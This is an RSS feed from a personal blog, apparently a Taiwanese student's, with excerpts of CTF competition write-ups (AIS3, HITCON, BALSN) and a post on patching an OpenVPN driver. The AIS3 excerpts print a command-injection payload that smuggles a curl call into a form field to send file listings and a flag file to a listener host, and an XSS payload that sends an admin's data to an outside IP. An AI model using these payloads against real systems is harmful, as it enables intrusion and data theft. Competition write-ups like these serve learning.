<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Chumy's Blog</title><link>https://hugo-profile.netlify.app/</link><description>Recent content on Chumy's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 08 Jan 2024 00:00:00 +0800</lastBuildDate><atom:link href="https://hugo-profile.netlify.app/index.xml" rel="self" type="application/rss+xml"/><item><title>AIS3 EOF 2024 Writeup</title><link>https://hugo-profile.netlify.app/blogs/ais3-eof-2024-writeup/</link><pubDate>Mon, 08 Jan 2024 00:00:00 +0800</pubDate><guid>https://hugo-profile.netlify.app/blogs/ais3-eof-2024-writeup/</guid><description>Misc Welcome 題目 Flag AIS3{W3lc0mE_T0_A1S5s_EOF_2o24}
Web DNS Lookup Tool: Final Webpage 解題 正常
不存在 domain
使用違規字元
讀 code 找到 blacklist
發現 $() 沒檔，測一下
過了
exploit #!/usr/bin/env python3 from flask import Flask,request,redirect,Response app = Flask(__name__) @app.route(&amp;#39;/&amp;#39;,methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;]) def root(): print(request.stream.read().decode()) return &amp;#34;com&amp;#34; @app.route(&amp;#39;/&amp;lt;path:data&amp;gt;&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def run(data): print(data) return &amp;#34;com&amp;#34; if __name__ == &amp;#34;__main__&amp;#34;: app.run(host=&amp;#34;::&amp;#34;, port=80) payload curl http://10.105.0.21:21520/ -d &amp;#39;name=example.$(curl 10.105.2.22 -d &amp;#34;$(ls /)&amp;#34;)&amp;#39; curl http://10.105.0.21:21520/ -d &amp;#39;name=example.$(curl 10.105.2.22 -d &amp;#34;$(cat /flag_SWeUMks9hGYFciax)&amp;#34;)&amp;#39; curl http://10.</description></item><item><title>AIS3 Pre Exam 2023 Writeup</title><link>https://hugo-profile.netlify.app/blogs/ais3-pre-exam-2023-writeup/</link><pubDate>Tue, 23 May 2023 00:00:00 +0800</pubDate><guid>https://hugo-profile.netlify.app/blogs/ais3-pre-exam-2023-writeup/</guid><description>Welcome 題目 解題 讀一下 pdf
E-Portfolio baby 題目 解題 網頁進來是登入介面 About 那邊可以放 html 看起來可以 XSS 測一下 看起來可以 用 flask 隨便寫個 server 聽 request
#!/usr/bin/env python3 from flask import Flask,request,redirect,Response app = Flask(__name__) @app.route(&amp;#39;/&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def data(): print(request.args) return &amp;#34;aaa&amp;#34; if __name__ == &amp;#34;__main__&amp;#34;: app.run(host=&amp;#34;0.0.0.0&amp;#34;,port=80) payload
&amp;lt;h5&amp;gt;Hello!&amp;lt;/h5&amp;gt; I am a &amp;lt;span style=&amp;#34;color: red;&amp;#34;&amp;gt;new&amp;lt;/span&amp;gt; user. &amp;lt;img src=x onerror=&amp;#39;fetch(&amp;#34;/api/portfolio&amp;#34;).then(res =&amp;gt; res.json()).then(data =&amp;gt; {fetch(`http://10.113.193.20?${new URLSearchParams(data.data)}`)})&amp;#39;/&amp;gt; 送去給 admin 然後就收到 flag 了 Flag AIS3{&amp;lt;img src=x onerror='fetch(...}
ManagementSystem 題目 解題 IDA 打開 人真好有給 shell code 每個 user 的 function 找一遍後發現 delete_user 有用 gets，可以 stack overflow，先讓他跑到 &amp;quot;Invalid index.</description></item><item><title>從 Wireshark 到 patch OpenVPN driver</title><link>https://hugo-profile.netlify.app/blogs/openvpn-patch/</link><pubDate>Sat, 08 Apr 2023 00:00:00 +0800</pubDate><guid>https://hugo-profile.netlify.app/blogs/openvpn-patch/</guid><description>緣由 當初會這樣是因為接到一個很有趣的 case
簡單來說就是想要 client 可以打 VPN 到另一邊，並且讓 PPPoE 可以透過 VPN 拿到中華電信的 public IP address。
由於 PPPoE 是 L2 的協定，需要 ethernet header，因此 VPN 的選擇上就需要用 L2 Tunnel。關於甚麼是 L2 Tunnel 可以去看這篇文章與這篇文章。
這邊我選擇用 OpenVPN tap 作為 L2 Tunnel。
過程 於是乎我開始架設 VPN 架設的 config 可以參考這裡。
架好的我開開心心的用 windows 測試
到這邊我想說拿到 IP 了應該能動了，結果 ping 一下發現出不去。
這就很奇怪了，於是乎我 ping 看看 ipv6 看看是不是一樣的問題，結果可以通。
這下有趣了，V4 沒通 V6 有通，怎麼想都不正常，再加上我兩個都有拿到 IP。
而作為一個遇到問題會死命 debug 的我直接就開始抓包測試。
可以發現 ICMP ping 確實有封裝上 PPPoE header 並且從 VPN 網卡送出，且 VPN server 是有收到並轉發出去的，但是遲遲沒收到 response，因此可能是上游因為某些原因，可能不認可我們持有的 V4 IP 然後 drop 掉，但是認可 V6 的 IP。</description></item><item><title>HITCON CTF 2021 Writeup</title><link>https://hugo-profile.netlify.app/blogs/hitconctf-2022-writeup/</link><pubDate>Mon, 28 Nov 2022 00:00:00 +0800</pubDate><guid>https://hugo-profile.netlify.app/blogs/hitconctf-2022-writeup/</guid><description>hitconctf-2022-writeup 戰績 checker Disassemble checker.exe and checker_drv.sys using IDA Pro. We can know that the checker sends the 0x222080u code to the checker_drv driver to check if there is a &amp;ldquo;hitcon&amp;rdquo; at address 0x140003000.
checker.exe:
checker_drv.sys:
Also, there are other codes that can be sent that will use the data from addresses 0x140003030 to 0x14000312F to change the function at address 0x14001B30, and then use that function to calculate the hex data from addresses 0x140003000 to 0x14000302A.</description></item><item><title>AIS3 Pre Exam 2022 Writeup</title><link>https://hugo-profile.netlify.app/blogs/ais3-pre-exam-2022-writeup/</link><pubDate>Tue, 17 May 2022 00:00:00 +0800</pubDate><guid>https://hugo-profile.netlify.app/blogs/ais3-pre-exam-2022-writeup/</guid><description>Score Board Welcome Welcome 題目 Flag AIS3{WTF did I just see the FLAG before CTF starts?}
Misc Excel 題目 解題 Flag AIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}
Gift in the dream 題目 解題 binwalk gift_in_the_dream.gif 一下發現啥都沒有。 strings gift_in_the_dream.gif 一下看到一堆重複出現的奇怪字串，應該是提示。 通靈一下發現應該要用 identify 把每個幀數間的間距時間抓出來應該就是 flag 了。 Script #!/bin/bash for a in $(identify -format &amp;#34;%s %T \n&amp;#34; gift_in_the_dream.gif | awk &amp;#39;{print $2}&amp;#39;) do printf &amp;#34;%02X&amp;#34; $a | xxd -r -p done Flag AIS3{5T3gn0gR4pHy_c4N_b3_fUn_s0m37iMe}
Knock 題目 解題 原本以為是 Web 題，後來想想又好像不對，request 抓出來改用 curl 跑。 curl -X POST http://chals1.</description></item><item><title>AIS3 EOF 2021 Writeup</title><link>https://hugo-profile.netlify.app/blogs/ais3-eof-2021-writeup/</link><pubDate>Sun, 16 Jan 2022 00:00:00 +0800</pubDate><guid>https://hugo-profile.netlify.app/blogs/ais3-eof-2021-writeup/</guid><description>leetcall 題目 限制 payload # Problem 1: Hello print(getattr(&amp;#34;Hello, {:}!&amp;#34;, &amp;#39;format&amp;#39;)(getattr(&amp;#39;!\nHello, &amp;#39;, &amp;#39;join&amp;#39;)(getattr(getattr(open(0),&amp;#39;read&amp;#39;)(),&amp;#39;splitlines&amp;#39;)()))) # Problem 2: Fibonacci print(getattr(&amp;#39;\n&amp;#39;,&amp;#39;join&amp;#39;)(map(str,map(round,map(getattr(0.4472135954999579,&amp;#39;__mul__&amp;#39;),map(getattr(1.618033988749895,&amp;#39;__pow__&amp;#39;),map(int,getattr(open(0),&amp;#39;readlines&amp;#39;)()))))))) # Problem 3: FizzBuzz getattr(&amp;#39;&amp;#39;,&amp;#39;format&amp;#39;)(setattr(__builtins__,&amp;#39;a&amp;#39;,range(1,10001)),setattr(__builtins__,&amp;#39;b&amp;#39;,list(map(bool,map(getattr(3,&amp;#39;__rmod__&amp;#39;),a)))),setattr(__builtins__,&amp;#39;c&amp;#39;,list(map(bool,map(getattr(5,&amp;#39;__rmod__&amp;#39;),a)))),print(getattr(&amp;#39;\n&amp;#39;,&amp;#39;join&amp;#39;)(map(getattr(str,&amp;#39;__add__&amp;#39;),map(getattr(str,&amp;#39;__add__&amp;#39;),map(getattr(str,&amp;#39;__mul__&amp;#39;),map(str,a),map(getattr(bool,&amp;#39;__and__&amp;#39;),b,c)),map(getattr(&amp;#39;Fizz&amp;#39;,&amp;#39;__mul__&amp;#39;),map(getattr(0,&amp;#39;__eq__&amp;#39;),b))),map(getattr(&amp;#39;Buzz&amp;#39;,&amp;#39;__mul__&amp;#39;),map(getattr(0,&amp;#39;__eq__&amp;#39;),c)))))) flag FLAG{actually_you_can_also_solve_those_leetcode_challenges_in_this_way:D}
SSRF Challenge or Not? 題目 網址 https://ssrf.h4ck3r.quest/
解題 flag FLAG{well, maybe not? XD}</description></item><item><title>BALSN 2021 WriteUp</title><link>https://hugo-profile.netlify.app/blogs/balsn-2021-writeup/</link><pubDate>Mon, 22 Nov 2021 00:00:00 +0800</pubDate><guid>https://hugo-profile.netlify.app/blogs/balsn-2021-writeup/</guid><description>balsn-2021-writeup 戰績 Metaeasy 題目 server code class MasterMetaClass(type): def __new__(cls, class_name, class_parents, class_attr): def getFlag(self): print(&amp;#39;Here you go, my master&amp;#39;) with open(&amp;#39;flag&amp;#39;) as f: print(f.read()) class_attr[getFlag.__name__] = getFlag attrs = ((name, value) for name, value in class_attr.items() if not name.startswith(&amp;#39;__&amp;#39;)) class_attr = dict((&amp;#39;IWant&amp;#39;+name.upper()+&amp;#39;Plz&amp;#39;, value) for name, value in attrs) newclass = super().__new__(cls, class_name, class_parents, class_attr) return newclass def __init__(*argv): print(&amp;#39;Bad guy! No Flag !!&amp;#39;) raise &amp;#39;Illegal&amp;#39; class BalsnMetaClass(type): def getFlag(self): print(&amp;#39;You\&amp;#39;re not Master!</description></item></channel></rss>